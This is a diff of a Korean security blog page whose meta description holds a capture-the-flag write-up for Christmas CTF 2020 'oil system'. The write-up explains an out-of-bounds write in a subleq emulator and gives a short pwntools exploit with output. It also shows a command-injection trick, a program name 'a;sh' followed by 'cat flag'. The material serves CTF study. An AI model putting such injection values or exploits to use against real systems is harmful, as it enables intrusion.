@@ -20,8 +20,73 @@
 
   <meta property="og:type" content="website"> 
   <meta property="og:title" content="[Write-Up] Christmas CTF 2020 - oil system - hackyboiz">
-  <meta property="og:description" content="hack &amp; life">
-  <meta property="og:image" content="/img/favicon.ico">
+  <meta property="og:description" content="&lt;h1 id=&#34;&amp;#xBA38;&amp;#xB9BF;&amp;#xB9D0;&#34;&gt;&lt;a href=&#34;#&amp;#xBA38;&amp;#xB9BF;&amp;#xB9D0;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xBA38;&amp;#xB9BF;&amp;#xB9D0;&#34;&gt;&lt;/a&gt;&amp;#xBA38;&amp;#xB9BF;&amp;#xB9D0;&lt;/h1&gt;&lt;p&gt;CVE-2020&amp;#x2013;15647&amp;#xB294; Firefox Fennec v68.9.0&amp;#xC5D0;&amp;#xC11C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; Arbitrary local file access&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD30C;&amp;#xC77C;&amp;#xC744; Cache &amp;#xD560; &amp;#xB54C; &amp;#xD574;&amp;#xB2F9; &amp;#xD30C;&amp;#xC77C;&amp;#xC758; &amp;#xC774;&amp;#xB984;&amp;#xC744; &amp;#xD574;&amp;#xC26C; &amp;#xD574;&amp;#xC57C; &amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; Firefox Fennec v68.9.0&amp;#xC758; &lt;code&gt;content:// URI&lt;/code&gt; &amp;#xB85C;&amp;#xC9C1;&amp;#xC5D4; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; Arbitrary local file access&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB7F0; &amp;#xC0C1;&amp;#xD669;&amp;#xC744; pwnable &amp;#xBB38;&amp;#xC81C;&amp;#xB85C; &amp;#xAD6C;&amp;#xD604;&amp;#xD574;&amp;#xBD24;&amp;#xB294;&amp;#xB370;&amp;#x2026;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2020/12/29/fabu1ous/oil-system/1.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;unintended solution&amp;#xC73C;&amp;#xB85C; &amp;#xCEE4;&amp;#xBA58;&amp;#xB4DC; &amp;#xC778;&amp;#xC81D;&amp;#xC158;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC0C1;&amp;#xC704;&amp;#xAD8C; &amp;#xC194;&amp;#xBE0C;&amp;#xAC00; &amp;#xBAA8;&amp;#xB450; &amp;#xCEE4;&amp;#xBA58;&amp;#xB4DC; &amp;#xC778;&amp;#xC81D;&amp;#xC158;&amp;#xC774;&amp;#xB354;&amp;#xAD70;&amp;#xC694;&amp;#x2026; &amp;#xD558;&amp;#xD558;&amp;#xD558;. &amp;#xBB38;&amp;#xC81C; &amp;#xAC80;&amp;#xC218; &amp;#xB2E8;&amp;#xACC4;&amp;#xC5D0;&amp;#xC11C; &amp;#xCEE4;&amp;#xBA58;&amp;#xB4DC; &amp;#xC778;&amp;#xC81D;&amp;#xC158;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xB9D0;&amp;#xC774; &amp;#xB098;&amp;#xC640;&amp;#xC11C; &amp;#xC218;&amp;#xC815;&amp;#xD558;&amp;#xACE0; &amp;#xAC80;&amp;#xC99D;&amp;#xAE4C;&amp;#xC9C0; &amp;#xD588;&amp;#xB294;&amp;#xB370; &amp;#xC218;&amp;#xC815; &amp;#xC548;&amp;#xB41C; &amp;#xBC84;&amp;#xC804;&amp;#xC774; &amp;#xB300;&amp;#xD68C; &amp;#xB54C; &amp;#xC62C;&amp;#xB77C;&amp;#xAC14;&amp;#xB124;&amp;#xC694;.&lt;/p&gt;
+&lt;p&gt;oil-system &amp;#xBB38;&amp;#xC81C;&amp;#xB97C; &amp;#xD480;&amp;#xC5B4;&amp;#xC8FC;&amp;#xC2E0; &amp;#xBD84;&amp;#xB4E4;&amp;#xAED8; &amp;#xC815;&amp;#xB9D0; &amp;#xC8C4;&amp;#xC1A1;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC870;&amp;#xAE08; &amp;#xB354; &amp;#xCCA0;&amp;#xC800;&amp;#xD558;&amp;#xAC8C; &amp;#xC900;&amp;#xBE44;&amp;#xD588;&amp;#xC5B4;&amp;#xC57C; &amp;#xB410;&amp;#xB294;&amp;#xB370;&amp;#x2026;&lt;/p&gt;
+&lt;h1 id=&#34;&amp;#xD480;&amp;#xC774;-&amp;#xC694;&amp;#xC57D;&#34;&gt;&lt;a href=&#34;#&amp;#xD480;&amp;#xC774;-&amp;#xC694;&amp;#xC57D;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xD480;&amp;#xC774; &amp;#xC694;&amp;#xC57D;&#34;&gt;&lt;/a&gt;&amp;#xD480;&amp;#xC774; &amp;#xC694;&amp;#xC57D;&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;/2020/12/29/fabu1ous/oil-system/2.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2020/12/29/fabu1ous/oil-system/3.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xBB38;&amp;#xC81C; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xB294; subleq&amp;#xC774;&amp;#xB77C;&amp;#xB294; One-Instruction-Language system &amp;#xC5D0;&amp;#xBBAC;&amp;#xB808;&amp;#xC774;&amp;#xD130;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. subleq &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xB2F4;&amp;#xACE0; &amp;#xC788;&amp;#xB294; &amp;#xD30C;&amp;#xC77C;&amp;#xC5D0;&amp;#xC11C; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC77D;&amp;#xC5B4;&amp;#xC640; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xACE0; &amp;#xADF8; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xD574;&amp;#xC11D;&amp;#xD574; &amp;#xB3D9;&amp;#xC791;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. subleq&amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xD574;&amp;#xC11D;&amp;#xD558;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xC5D0; OOB &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD574; &amp;#xB9AC;&amp;#xD134; &amp;#xAC12;&amp;#xC744; &amp;#xC870;&amp;#xC791;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. subleq &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xB2F4;&amp;#xACE0; &amp;#xC788;&amp;#xB294; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; cache &amp;#xD558;&amp;#xB294; &amp;#xB8E8;&amp;#xD2F4;&amp;#xB3C4; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294;&amp;#xB370; &amp;#xD30C;&amp;#xC77C;&amp;#xC758; &amp;#xACBD;&amp;#xB85C;&amp;#xB9CC; &amp;#xBC14;&amp;#xB014; &amp;#xBFD0; &amp;#xD30C;&amp;#xC77C;&amp;#xBA85;&amp;#xC744; &amp;#xC720;&amp;#xC9C0;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. Write Code &amp;#xAE30;&amp;#xB2A5;&amp;#xC73C;&amp;#xB85C; flag&amp;#xB77C;&amp;#xB294; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xC0DD;&amp;#xC131;&amp;#xD558;&amp;#xACE0; &amp;#xC2E4;&amp;#xC81C; flag&amp;#xD30C;&amp;#xC77C;&amp;#xC774; cache &amp;#xB418;&amp;#xB3C4;&amp;#xB85D; &amp;#xB9AC;&amp;#xD134; &amp;#xAC12;&amp;#xC744; &amp;#xC720;&amp;#xB3C4;&amp;#xD558;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;h1 id=&#34;&amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&#34;&gt;&lt;a href=&#34;#&amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&#34;&gt;&lt;/a&gt;&amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&lt;/h1&gt;&lt;ul&gt;
+&lt;li&gt;OOB&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;/2020/12/29/fabu1ous/oil-system/4.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xC704; &amp;#xC0AC;&amp;#xC9C4;&amp;#xC740; &amp;#xD568;&amp;#xC218; subleq()&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. a2&amp;#xC758; index&amp;#xB85C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xB294; v4&amp;#xC640; v5&amp;#xC758; &amp;#xCD5C;&amp;#xB313;&amp;#xAC12;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; oob write&amp;#xAC00; &amp;#xAC00;&amp;#xB2A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. v4&amp;#xC640; v5&amp;#xAC12;&amp;#xB97C; &amp;#xC774;&amp;#xC6A9;&amp;#xD574; a2&amp;#xBCF4;&amp;#xB2E4; &amp;#xB192;&amp;#xC740; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xC788;&amp;#xB294; &amp;#xC2A4;&amp;#xD0DD; &amp;#xC5B4;&amp;#xB514;&amp;#xB4E0; &amp;#xCC38;&amp;#xC870;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xAC8C; &amp;#xB418;&amp;#xACE0; &amp;#xB9AC;&amp;#xD134; &amp;#xAC12;&amp;#xC744; &amp;#xC624;&amp;#xC5FC;&amp;#xC2DC;&amp;#xD0AC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;h1 id=&#34;Exploit&#34;&gt;&lt;a href=&#34;#Exploit&#34; class=&#34;headerlink&#34; title=&#34;Exploit&#34;&gt;&lt;/a&gt;Exploit&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt;*
+
+p = remote(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;localhost&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1234&lt;/span&gt;)
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# Write Code&lt;/span&gt;
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;&amp;gt; &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;2&amp;apos;&lt;/span&gt;)
+p.sendafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Enter your Program\&amp;apos;s Name : &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;flag&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Enter Code : &amp;apos;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;4 166 -1 -1 -1054&amp;apos;&lt;/span&gt;)
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# Run Code&lt;/span&gt;
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;&amp;gt; &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;3&amp;apos;&lt;/span&gt;)
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# Get flag with View Cached code&lt;/span&gt;
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;&amp;gt; &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;4&amp;apos;&lt;/span&gt;)
+
+p.interactive()&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;[+] Opening&lt;span class=&#34;hljs-built_in&#34;&gt; connection &lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;to&lt;/span&gt; localhost on&lt;span class=&#34;hljs-built_in&#34;&gt; port &lt;/span&gt;1234: Done
+[*] Switching &lt;span class=&#34;hljs-keyword&#34;&gt;to&lt;/span&gt; interactive mode
+XMAS{U5e_Ma11oc_Nex7_tim3_Mr_Kim}
+
+ ========[ Menu ]========
+ 1. Read test description
+ 2. Write Code
+ 3. &lt;span class=&#34;hljs-builtin-name&#34;&gt;Run&lt;/span&gt; Code
+ 4. View Cached code
+ &amp;gt; TIMEOUT
+[*] Got EOF &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; reading &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; interactive&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;Command-injection&#34;&gt;&lt;a href=&#34;#Command-injection&#34; class=&#34;headerlink&#34; title=&#34;Command injection&#34;&gt;&lt;/a&gt;Command injection&lt;/h1&gt;&lt;ul&gt;
+&lt;li&gt;unintended solution&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;/2020/12/29/fabu1ous/oil-system/5.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xD30C;&amp;#xC77C;&amp;#xBA85; &amp;#xD544;&amp;#xD130; &amp;#xD568;&amp;#xC218;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD30C;&amp;#xC77C;&amp;#xBA85;&amp;#xC5D0; &amp;#xC601;&amp;#xBB38; &amp;#xC18C;&amp;#xBB38;&amp;#xC790; &amp;#xC774;&amp;#xC678;&amp;#xC758; &amp;#xC785;&amp;#xB825;&amp;#xC774; &amp;#xB4E4;&amp;#xC5B4;&amp;#xC628;&amp;#xB2E4;&amp;#xBA74; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xB97C; &amp;#xC885;&amp;#xB8CC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC548;&amp;#xD0C0;&amp;#xAE5D;&amp;#xAC8C;&amp;#xB3C4; &amp;#xC720;&amp;#xC2EC;&amp;#xD788; &amp;#xBCF4;&amp;#xC2DC;&amp;#xBA74; &amp;#xCCAB; &amp;#xAE00;&amp;#xC790;&amp;#xB9CC; &amp;#xAC80;&amp;#xC0AC;&amp;#xD55C;&amp;#xB2E4;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;s&gt;&amp;#xBB38;&amp;#xC81C; &amp;#xB9CC;&amp;#xB4E0; &amp;#xB188;&amp;#xC774; &amp;#xD535;&amp;#xC2E0;&amp;#xC778;&amp;#xB4EF;&lt;/s&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs plain&#34;&gt; ========[ Menu ]========
+ 1. Read test description
+ 2. Write Code
+ 3. Run Code
+ 4. View Cached code
+ &amp;gt; 2
+
+ Enter your Program&amp;apos;s Name : a;sh
+
+ Enter Code : your an idiot
+
+ ========[ Menu ]========
+ 1. Read test description
+ 2. Write Code
+ 3. Run Code
+ 4. View Cached code
+ &amp;gt; 3
+ Error while fopen
+$ cat flag
+XMAS{U5e_Ma11oc_Nex7_tim3_Mr_Kim}
+$&lt;/code&gt;&lt;/pre&gt;
+ - hack &amp; life">
+  <meta property="og:image" content="/thumbnail.png">
   <meta property="og:url" content="https://hackyboiz.github.io/">
 
   <link rel="canonical" href="https://hackyboiz.github.io/2020/12/29/fabu1ous/oil-system/">
@@ -365,9 +430,9 @@ $</code></pre>
                 <article class="post-prev col-6">
                   
                   
-                  <a href="/2020/12/29/fabu1ous/no-g/">
+                  <a href="/2020/12/29/fabu1ous/match-maker/">
                     <i class="iconfont icon-arrowleft"></i>
-                    <span class="hidden-mobile">[Write-Up] Christmas CTF 2020 - No g</span>
+                    <span class="hidden-mobile">[Write-Up] Christmas CTF 2020 - Match Maker</span>
                     <span class="visible-mobile">Previous</span>
                   </a>
                   
@@ -375,8 +440,8 @@ $</code></pre>
                 <article class="post-next col-6">
                   
                   
-                  <a href="/2020/12/29/idioth/christmasctf2020-angrforge/">
-                    <span class="hidden-mobile">[Write-Up] Christmas CTF 2020 - angrforge</span>
+                  <a href="/2020/12/29/fabu1ous/no-g/">
+                    <span class="hidden-mobile">[Write-Up] Christmas CTF 2020 - No g</span>
                     <span class="visible-mobile">Next</span>
                     <i class="iconfont icon-arrowright"></i>
                   </a>
